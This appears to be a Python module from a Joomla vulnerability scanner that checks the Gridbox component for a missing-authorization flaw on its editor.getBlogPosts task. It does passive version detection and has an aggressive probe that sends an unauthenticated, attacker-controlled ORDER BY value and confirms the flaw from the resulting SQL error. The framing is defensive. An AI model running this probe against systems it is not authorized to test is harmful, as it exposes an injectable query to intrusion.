from __future__ import annotations

import secrets
from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-102789"
NAME = "Gridbox editor getBlogPosts missing authorization"
COMPONENT = "Gridbox (com_gridbox)"
AFFECTED_RULE = "Gridbox 1.0.0 through 2.20.4.2; fixed in 2.20.5.0"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe", "aggressive"]
EDITOR_PATH = "/index.php?option=com_gridbox&task=editor.getBlogPosts"
ERROR_SIGNATURE = "Unknown column"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    fixed = parse_version_safe("2.20.5.0")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("gridbox", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Gridbox was not detected through its public manifest or asset paths.", action="No action is required unless Gridbox is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Gridbox {version}, within the affected range below 2.20.5.0."
        action = "Upgrade Gridbox to 2.20.5.0 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Gridbox {version}, which includes the editor authorization fix."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Gridbox was detected, but its version could not be determined."
        action = "Determine the installed Gridbox version and upgrade to 2.20.5.0 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    """Error-based proof of the missing editor authorization.

    ``EditorController::getBlogPosts()`` passes the unauthenticated ``order``
    parameter into the blog-posts ORDER BY clause. A nonexistent column makes
    the query fail with ``Unknown column`` on 2.20.0.2; 2.20.5.0 calls
    ``GridboxHelper::checkUserEditLevel()`` first and never reaches the query.
    """
    base = normalize_url(target_url)
    column = f"proofcms_{secrets.token_hex(4)}"
    url = f"{base}{EDITOR_PATH}&id=0&max=10&limit=10&order={column}"
    client = HttpClient(timeout=timeout, proxy=proxy)
    response = client.get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The Gridbox editor task could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")

    body = response.get("body") or ""
    status = response.get("status")
    evidence = {
        "editor_url": url,
        "order_column": column,
        "status": status,
        "sql_error": ERROR_SIGNATURE in body,
        "body_length": len(body),
    }
    if status == 500 and ERROR_SIGNATURE in body and column in body:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=url,
            evidence=evidence,
            detail=(
                "An unauthenticated request to editor.getBlogPosts reached the blog-posts query and "
                f"returned the SQL error for the controlled column {column!r}. The editor task does not "
                "enforce the edit-level check."
            ),
            action="Upgrade Gridbox to 2.20.5.0 or newer.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=url,
        evidence=evidence,
        detail=f"The editor task returned HTTP {status} without the controlled SQL error; the missing-authorization path did not trigger.",
        action="Upgrade affected Gridbox versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}{EDITOR_PATH}&id=0&max=10&limit=10&order=created"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The Gridbox editor task could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    if response.get("status") == 200 and "Unknown column" not in (response.get("body") or ""):
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The Gridbox editor task is reachable; the error-based authorization proof was not sent in safe mode.", action="Use aggressive mode on an authorized staging site to verify the missing editor check.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The Gridbox editor task was not reachable or returned an unexpected response.", action="Verify the component and editor endpoint on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Gridbox was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (reachability) and aggressive (error-based) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Missing Authorization", "module_version": "1.0.0", "last_reviewed": "2026-11-15", "updated": "2026-11-15", "required_detectors": ["gridbox"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-102789", "https://www.balbooa.com/gridbox", "https://mysites.guru/vulnerabilities/gridbox/"]}
